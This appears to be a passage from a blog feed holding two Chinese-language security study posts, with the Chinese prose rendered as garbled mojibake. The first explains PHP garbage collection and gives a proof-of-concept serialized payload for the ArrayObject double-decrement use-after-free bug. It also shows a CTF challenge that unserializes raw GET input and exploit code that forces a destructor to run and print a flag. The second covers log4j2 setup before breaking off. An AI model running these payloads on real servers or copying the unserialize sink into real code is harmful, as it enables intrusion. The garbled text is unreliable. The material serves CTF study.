title="__destructé­”æœ¯æ–¹æ³•"></a>__destructé­”æœ¯æ–¹æ³•</h3><p>å½“æŸä¸ªå¯¹è±¡æˆä¸ºåƒåœ¾æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œ</p><ul><li>æ˜¾ç¤ºé”€æ¯ï¼šunsetæˆ–èµ‹å€¼NULL</li><li>éšå¼é”€æ¯ï¼šä»£ç æ‰§è¡Œå®Œæ¯•åå°†æ‰€æœ‰ç”³è¯·çš„å†…å­˜é‡Šæ”¾æ‰</li></ul><blockquote><p>åœ¨å¸¸è§„æ€è·¯ä¸­destructæ˜¯éšå¼é”€æ¯è§¦å‘çš„,å°è¯•æ˜¾å¼é”€æ¯</p></blockquote><h3 id="æ—§ç‰ˆæœ¬GC"><a href="#æ—§ç‰ˆæœ¬GC" class="headerlink" title="æ—§ç‰ˆæœ¬GC"></a>æ—§ç‰ˆæœ¬GC</h3><p>ç®€å•çš„åˆ¤æ–­äº†ä¸€ä¸‹å˜é‡çš„zvalçš„refcountæ˜¯å¦ä¸º0ï¼Œæ˜¯çš„è¯å°±é‡Šæ”¾å¦åˆ™ä¸é‡Šæ”¾ç›´è‡³è¿›ç¨‹ç»“æŸã€‚</p><h3 id="æ–°ç‰ˆæœ¬GC-zvalç»“æ„ä½“"><a href="#æ–°ç‰ˆæœ¬GC-zvalç»“æ„ä½“" class="headerlink" title="æ–°ç‰ˆæœ¬GC-zvalç»“æ„ä½“"></a>æ–°ç‰ˆæœ¬GC-zvalç»“æ„ä½“</h3><p>ä¸»åŠ¨é”€æ¯å˜é‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;111&quot;</span>;<br><span class="hljs-variable">$temp_name</span> = &amp;<span class="hljs-variable">$name</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;name&#x27;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$temp_name</span>);<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;name&#x27;</span>);<br><span class="hljs-comment">//name:</span><br><span class="hljs-comment">//(refcount=2, is_ref=1)string &#x27;111&#x27; (length=3)</span><br><span class="hljs-comment">//name:</span><br><span class="hljs-comment">//(refcount=1, is_ref=1)string &#x27;111&#x27; (length=3)</span><br></code></pre></td></tr></table></figure><p>refcountè®¡æ•°å‡1ï¼Œè¯´æ˜unsetå¹¶éä¸€å®šä¼šé‡Šæ”¾å†…å­˜ï¼Œå½“æœ‰ä¸¤ä¸ªå˜é‡æŒ‡å‘çš„æ—¶å€™ï¼Œå¹¶éä¼šé‡Šæ”¾å˜é‡å ç”¨çš„å†…å­˜ï¼Œåªæ˜¯refcountå‡1.</p><h3 id="è§¦å‘åƒåœ¾å›æ”¶"><a href="#è§¦å‘åƒåœ¾å›æ”¶" class="headerlink" title="è§¦å‘åƒåœ¾å›æ”¶"></a>è§¦å‘åƒåœ¾å›æ”¶</h3><p>è¯¥ç®—æ³•çš„å®ç°å¯ä»¥åœ¨<code>Zend/zend_gc.c</code>ï¼ˆ <a href="https://github.com/php/php-src/blob/PHP-5.6.0/Zend/zend_gc.c">https://github.com/php/php-src/blob/PHP-5.6.0/Zend/zend_gc.c</a> ï¼‰ä¸­æ‰¾åˆ°ã€‚æ¯å½“é”€æ¯zvalæ—¶ï¼ˆå¦‚åœ¨è¯¥zvalä¸Šè°ƒç”¨unsetæ—¶ï¼‰ï¼Œåƒåœ¾å›æ”¶ç®—æ³•ä¼šæ£€æŸ¥å…¶æ˜¯å¦ä¸ºæ•°ç»„æˆ–å¯¹è±¡ï¼Œé™¤äº†è¿™ä¿©ä¸ªç±»å‹å¤–å…¶ä»–éƒ½ä¸èƒ½åŒ…å«å¾ªç¯å¼•ç”¨ï¼Œè¿™ä¸€æ£€æŸ¥è¿‡ç¨‹ä½¿ç”¨<code>gc_zval_possible_root</code>å‡½æ•°æ¥å®ç°ã€‚ä»»ä½•è¿™ç§æ½œåœ¨çš„zvaléƒ½è¢«ç§°ä¸ºæ ¹ï¼ˆRootï¼‰ï¼Œå¹¶ä¼šè¢«æ·»åŠ åˆ°ä¸€ä¸ªåä¸º<code>gc_root_buffer</code>çš„åˆ—è¡¨ä¸­ã€‚<br>ç„¶åï¼Œå°†ä¼šé‡å¤ä¸Šè¿°æ­¥éª¤ï¼Œç›´è‡³æ»¡è¶³ä¸‹è¿°æ¡ä»¶ä¹‹ä¸€ï¼š</p><ul><li><code>gc_collect_cycles()</code>è¢«æ‰‹åŠ¨è°ƒç”¨</li><li>åƒåœ¾å­˜å‚¨ç©ºé—´å°†æ»¡ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€ï¼Œåœ¨æ ¹ç¼“å†²åŒºçš„ä½ç½®å·²ç»å­˜å‚¨äº†10000ä¸ªzvalï¼Œå¹¶ä¸”å³å°†æ·»åŠ æ–°çš„æ ¹ã€‚10000æ—¶é¢„å®šä¹‰å¸¸é‡GC_ROOT_BUFFER_MAX_ENTRIES,å½“å‡ºç°ç¬¬10001ä¸ªzvalæ—¶ï¼Œå°†å†æ¬¡è°ƒç”¨gc_zval_possible_rootè¿›è¡Œæ£€æŸ¥ï¼Œæ­¤æ—¶ä¼šè°ƒç”¨<code>gc_collect_cycles</code>ä»¥å¤„ç†å¹¶åˆ·æ–°å½“å‰ç¼“å†²åŒº</li></ul><blockquote><p>å¯ä»¥å¾—åˆ°è§¦å‘æ€è·¯ï¼Œå¡«æ»¡åƒåœ¾å­˜å‚¨ç©ºé—´</p></blockquote><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><p>ååºåˆ—åŒ–è¿‡ç¨‹å…è®¸ä¸€éåˆä¸€éåœ°ä¼ é€’ç›¸åŒçš„ç´¢å¼•ï¼Œæ‰€ä»¥ä¸æ–­ä¼šå¡«å……å†…å­˜ç©ºé—´ã€‚ä¸€æ—¦é‡æ–°ä½¿ç”¨æ•°ç»„ç´¢å¼•ï¼Œæ—§å…ƒç´ çš„å¼•ç”¨è®¡æ•°å™¨å°±ä¼šé€’å‡ã€‚åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å°†ä¼šè°ƒç”¨<code>zend_hash_update</code>ï¼Œå®ƒå°†è°ƒç”¨æ—§å…ƒç´ çš„ææ„å‡½æ•°ï¼ˆDestructorï¼‰ã€‚æ¯å½“zvalè¢«é”€æ¯æ—¶ï¼Œéƒ½ä¼šæ¶‰åŠåˆ°åƒåœ¾å›æ”¶ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€ï¼Œæ‰€æœ‰åˆ›å»ºçš„æ•°ç»„éƒ½ä¼šå¼€å§‹å¡«å……åƒåœ¾ç¼“å†²åŒºï¼Œç›´è‡³è¶…å‡ºå…¶ç©ºé—´å¯¼è‡´å¯¹<code>gc_collect_cycles</code>çš„è°ƒç”¨ã€‚</p><h3 id="ArrayObject"><a href="#ArrayObject" class="headerlink" title="ArrayObject"></a>ArrayObject</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// POC of the ArrayObject GC vulnerability</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$serialized_string</span> = <span class="hljs-string">&#x27;a:1:&#123;i:1;C:11:&quot;ArrayObject&quot;:37:&#123;x:i:0;a:2:&#123;i:1;R:4;i:2;r:1;&#125;;m:a:0:&#123;&#125;&#125;&#125;&#x27;</span>;<br><span class="hljs-variable">$outer_array</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialized_string</span>);<br><span class="hljs-title function_ invoke__">gc_collect_cycles</span>();<br><span class="hljs-variable">$filler1</span> = <span class="hljs-string">&quot;aaaa&quot;</span>;<br><span class="hljs-variable">$filler2</span> = <span class="hljs-string">&quot;bbbb&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$outer_array</span>);<br></code></pre></td></tr></table></figure><p>å®é™…ä¸Šï¼Œä¸€æ—¦è¯¥ç¤ºä¾‹æ‰§è¡Œï¼Œå¤–éƒ¨æ•°ç»„ï¼ˆç”±<code>$outer_array</code>å¼•ç”¨ï¼‰å°†ä¼šè¢«é‡Šæ”¾ï¼Œå¹¶ä¸”zvalå°†ä¼šè¢«<code>$filter2</code>çš„zvalè¦†ç›–ï¼Œå¯¼è‡´è¾“å‡ºâ€bbbbâ€ã€‚</p><p>ArrayObjectçš„ååºåˆ—åŒ–å‡½æ•°æ¥å—å¯¹å¦ä¸€ä¸ªæ•°ç»„çš„å¼•ç”¨ï¼Œä»¥ç”¨äºåˆå§‹åŒ–çš„ç›®çš„ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€ï¼Œä¸€æ—¦æˆ‘ä»¬å¯¹ä¸€ä¸ªArrayObjectè¿›è¡Œååºåˆ—åŒ–åï¼Œå°±å¯ä»¥å¼•ç”¨ä»»ä½•ä¹‹å‰å·²ç»è¢«ååºåˆ—åŒ–è¿‡çš„æ•°ç»„ã€‚æ­¤å¤–ï¼Œè¿™è¿˜å°†å…è®¸æˆ‘ä»¬å°†æ•´ä¸ªå“ˆå¸Œè¡¨ä¸­çš„æ‰€æœ‰æ¡ç›®é€’å‡ä¸¤æ¬¡ã€‚</p><p>1ã€å¾—åˆ°ä¸€ä¸ªåº”è¢«é‡Šæ”¾çš„ç›®æ ‡zval Xï¼›<br>2ã€åˆ›å»ºä¸€ä¸ªæ•°ç»„Yï¼Œå…¶ä¸­åŒ…å«å‡ å¤„å¯¹zval Xçš„å¼•ç”¨ï¼š<code>array(ref_to_X, ref_to_X, [â€¦], ref_to_X)</code>ï¼›<br>3ã€åˆ›å»ºä¸€ä¸ªArrayObjectï¼Œå®ƒå°†ä½¿ç”¨æ•°ç»„Yçš„å†…å®¹è¿›è¡Œåˆå§‹åŒ–ï¼Œå› æ­¤ä¼šè¿”å›ä¸€æ¬¡ç”±åƒåœ¾å›æ”¶æ ‡è®°ç®—æ³•è®¿é—®è¿‡çš„æ•°ç»„Yçš„æ‰€æœ‰å­å…ƒç´ ã€‚<br>é€šè¿‡ä¸Šè¿°æ­¥éª¤ï¼Œæˆ‘ä»¬å¯ä»¥æ“çºµæ ‡è®°ç®—æ³•ï¼Œå¯¹æ•°ç»„Yä¸­çš„æ‰€æœ‰å¼•ç”¨å®ç°ä¸¤æ¬¡è®¿é—®ã€‚ä½†æ˜¯ï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­åˆ›å»ºå¼•ç”¨å°†ä¼šå¯¼è‡´å¼•ç”¨è®¡æ•°å™¨å¢åŠ 2ï¼Œæ‰€ä»¥è¿˜è¦æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼š<br>4ã€ä½¿ç”¨ä¸æ­¥éª¤3ç›¸åŒçš„æ–¹æ³•ï¼Œé¢å¤–å†åˆ›å»ºä¸€ä¸ªArrayObjectã€‚<br>ä¸€æ—¦æ ‡è®°ç®—æ³•è®¿é—®ç¬¬äºŒä¸ªArrayObjectï¼Œå®ƒå°†å¼€å§‹å¯¹æ•°ç»„Yä¸­çš„æ‰€æœ‰å¼•ç”¨è¿›è¡Œç¬¬ä¸‰æ¬¡é€’å‡ã€‚æˆ‘ä»¬ç°åœ¨å°±æœ‰æ–¹æ³•èƒ½å¤Ÿä½¿å¼•ç”¨è®¡æ•°å™¨é€’å‡ï¼Œå¯ä»¥å°†è¯¥æ–¹æ³•ç”¨äºå¯¹ä»»æ„ç›®æ ‡zvalçš„å¼•ç”¨è®¡æ•°å™¨å®ç°æ¸…é›¶ã€‚</p><p>ä¸¾ä¸ªä¾‹å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$flag</span> =<span class="hljs-string">&quot;flag&#123;&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(time).<span class="hljs-string">&quot;&#125;&quot;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;successful\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);<br><br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;ä¸­é€”é€€å‡ºå•¦&#x27;</span>);<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å‡å¦‚è¦æ‰§è¡Œ__destructæ–¹æ³•ï¼Œæ‰“å°flagï¼Œå°±å¾—ç»•è¿‡è¿™ä¸ª<code>throw new Exception</code>ã€‚å› ä¸º<code>__destruct</code>æ–¹æ³•æ˜¯åœ¨è¯¥å¯¹è±¡è¢«å›æ”¶æ—¶è°ƒç”¨ï¼Œè€Œ<code>exception</code>ä¼šä¸­æ–­è¯¥è¿›ç¨‹å¯¹è¯¥å¯¹è±¡çš„é”€æ¯ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦å¼ºåˆ¶è®©phpçš„GCï¼ˆåƒåœ¾å›æ”¶æœºåˆ¶ï¼‰å»è¿›è¡Œè¯¥å¯¹è±¡çš„å›æ”¶ã€‚</p><p>æ ¸å¿ƒæ€æƒ³ï¼šååºåˆ—åŒ–ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åå†åˆ©ç”¨ç¬¬ä¸€ä¸ªç´¢å¼•ï¼Œæ¥è§¦å‘GC</p><p>EXP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;AndyNoel&quot;</span>;<br>    &#125;<br>&#125; <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> B, <span class="hljs-keyword">new</span> B));<br><br><span class="hljs-comment">//a:2:&#123;i:0;O:1:&quot;B&quot;:0:&#123;&#125;i:1;O:1:&quot;B&quot;:0:&#123;&#125;&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>é€ æˆè¯¥æ¼æ´çš„ä¸»è¦åŸå› æ˜¯ArrayObjectç¼ºå°‘åƒåœ¾å›æ”¶å‡½æ•°ã€‚è¯¥æ¼æ´ç§°ä¸ºâ€œåŒé€’å‡æ¼æ´â€</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> gc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>log4j2æ¼æ´å­¦ä¹ </title>
      <link href="/2022/09/30/log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/09/30/log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="log4j2æ¼æ´å­¦ä¹ "><a href="#log4j2æ¼æ´å­¦ä¹ " class="headerlink" title="log4j2æ¼æ´å­¦ä¹ "></a>log4j2æ¼æ´å­¦ä¹ </h1><h2 id="log4jä¸log4j2åŒºåˆ«"><a href="#log4jä¸log4j2åŒºåˆ«" class="headerlink" title="log4jä¸log4j2åŒºåˆ«"></a>log4jä¸log4j2åŒºåˆ«</h2><h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><p>log4jç”¨.propertiesçš„æ–‡ä»¶ä½œä¸ºä¸»é…ç½®æ–‡ä»¶çš„ï¼Œè€Œç°åœ¨çš„log4j 2åˆ™å·²ç»å¼ƒç”¨äº†è¿™ç§æ–¹å¼ï¼Œé‡‡ç”¨çš„æ˜¯.xmlï¼Œ.jsonæˆ–è€….jsnè¿™ç§æ–¹å¼æ¥åš</p><h3 id="æ ¸å¿ƒjaråŒ…"><a href="#æ ¸å¿ƒjaråŒ…" class="headerlink" title="æ ¸å¿ƒjaråŒ…"></a>æ ¸å¿ƒjaråŒ…</h3><p>log4jåªéœ€è¦å¼•å…¥ä¸€ä¸ªjaråŒ…å³å¯ï¼Œ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è€Œlog4j 2åˆ™æ˜¯éœ€è¦2ä¸ªæ ¸å¿ƒ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>log4jå’Œlog4j 2çš„åŒ…è·¯å¾„æ˜¯ä¸åŒçš„,ç”šè‡³å¯ä»¥åœ¨ä¸€ä¸ªé¡¹ç›®ä¸­ä½¿ç”¨2ä¸ªç‰ˆæœ¬çš„æ—¥å¿—è¾“å‡º</p></blockquote><h3 id="æ–‡ä»¶æ¸²æŸ“"><a href="#æ–‡ä»¶æ¸²æŸ“" class="headerlink" title="æ–‡ä»¶æ¸²æŸ“"></a>æ–‡ä»¶æ¸²æŸ“</h3><p>log4jæƒ³è¦ç”Ÿæ•ˆï¼Œæˆ‘ä»¬éœ€è¦åœ¨web.xmlä¸­è¿›è¡Œé…ç½®</p><p>log4j2å°±æ¯”è¾ƒç®€å•ï¼Œä»¥mavenå·¥ç¨‹ä¸ºä¾‹ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠlog4j2.xmlæ”¾åˆ°å·¥ç¨‹resourceç›®å½•ä¸‹å°±è¡Œäº†ã€‚å¤§å®¶è®°ä½ä¸€ä¸ªç»†èŠ‚ç‚¹ï¼Œæ˜¯log4j2.xmlï¼Œè€Œä¸æ˜¯log4j.xmlï¼Œ<u>xmlåå­—å°‘ä¸ª2éƒ½ä¸è¡Œ</u></p><h3 id="logè°ƒç”¨"><a href="#logè°ƒç”¨" class="headerlink" title="logè°ƒç”¨"></a>logè°ƒç”¨</h3><p>log4j</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.log4j.Logger;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">LOGGER</span> <span class="hljs-operator">=</span> Logger.getLogger(Test.class.getName());<br></code></pre></td></tr></table></figure><p>log4j2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.Level;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(Test.class.getName());<br></code></pre></td></tr></table></figure><h2 id="è¸©å‘è®°å½•"><a href="#è¸©å‘è®°å½•" class="headerlink" title="è¸©å‘è®°å½•"></a>è¸©å‘è®°å½•</h2><p>å¦‚æœlog4j.propertiesä¸€ç›´ä¸èµ·ä½œç”¨ï¼Œå°†å…¶å¤åˆ¶åˆ°targetçš„classesxia</p><p><img src="/../../../../Pictures/%60log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%60/006y8mN6gy1h6qwvy8e0hj30r8056glt.jpg" alt="image-20221002140908570"></p><h3 id="ä¸€äº›é…ç½®æ•™è®­"><a href="#ä¸€äº›é…ç½®æ•™è®­" class="headerlink" title="ä¸€äº›é…ç½®æ•™è®­"></a>ä¸€äº›é…ç½®æ•™è®­</h3><p>æ³¨æ„ç‰ˆæœ¬å¯¹åº”</p><p>å¦‚æœæ˜¯2021.3çš„ideaï¼Œä¸è¦ä½¿ç”¨é«˜ç‰ˆæœ¬mavenï¼Œåº”ä½¿ç”¨3.5.4</p><h3 id="å¼•å…¥ä¾èµ–"><a href="#å¼•å…¥ä¾èµ–" class="headerlink" title="å¼•å…¥ä¾èµ–"></a>å¼•å…¥ä¾èµ–</h3><p>ç¬¬ä¸€æ¬¡å¼•å…¥ä¼šå› ä¸ºæ²¡æœ‰ä¸‹è½½è€Œçˆ†çº¢ï¼Œç‚¹å‡»åˆ·æ–°å³å¯</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232951.jpg" alt="image-20221002141921173"></p><h3 id="å¯¼åŒ…æ³¨æ„åç§°"><a href="#å¯¼åŒ…æ³¨æ„åç§°" class="headerlink" title="å¯¼åŒ…æ³¨æ„åç§°"></a>å¯¼åŒ…æ³¨æ„åç§°</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br></code></pre></td></tr></table></figure><blockquote><p>2.14.0 log4jå¯¼åŒ…</p></blockquote><h3 id="ç¨‹åºåŒ…-com-sun-jndi-rmi-registry-ä¸å¯è§"><a href="#ç¨‹åºåŒ…-com-sun-jndi-rmi-registry-ä¸å¯è§" class="headerlink" title="ç¨‹åºåŒ… com.sun.jndi.rmi.registry ä¸å¯è§"></a>ç¨‹åºåŒ… com.sun.jndi.rmi.registry ä¸å¯è§</h3><p>æ³¨æ„ï¼šè¿˜æ˜¯å¾—æ¢æˆjdk1.8</p><p>è§£å†³ï¼Œåœ¨pom.xmlä¸­åŠ å…¥ä»¥ä¸‹æ ‡ç­¾</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>$&#123;java.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>$&#123;java.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">encoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">encoding</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">compilerArguments</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">bootclasspath</span>&gt;</span>$&#123;java.home&#125;/lib/rt.jar<span class="hljs-tag">&lt;/<span class="hljs-name">bootclasspath</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">compilerArguments</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼špluginæ ‡ç­¾è¦åŒ…è£¹åœ¨pluginsä¸­ï¼Œpluginsè¦åŒ…è£¹åœ¨buildä¸­</p></blockquote><h2 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h2><p>ä¸€èˆ¬å°†æ—¥å¿—å¯¹è±¡å®šä¹‰ä¸ºå½“å‰ç±»ç­‰é™æ€ç§æœ‰æˆå‘˜</p><h3 id="ä½¿ç”¨å ä½ç¬¦-æ‰“å°æ—¥å¿—"><a href="#ä½¿ç”¨å ä½ç¬¦-æ‰“å°æ—¥å¿—" class="headerlink" title="ä½¿ç”¨å ä½ç¬¦{}æ‰“å°æ—¥å¿—"></a>ä½¿ç”¨å ä½ç¬¦{}æ‰“å°æ—¥å¿—</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;bob&quot;</span>;<br><br>    logger.error(<span class="hljs-string">&quot;&#123;&#125; is not exited!&quot;</span>,user);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸæ‰“å°</p><p><img 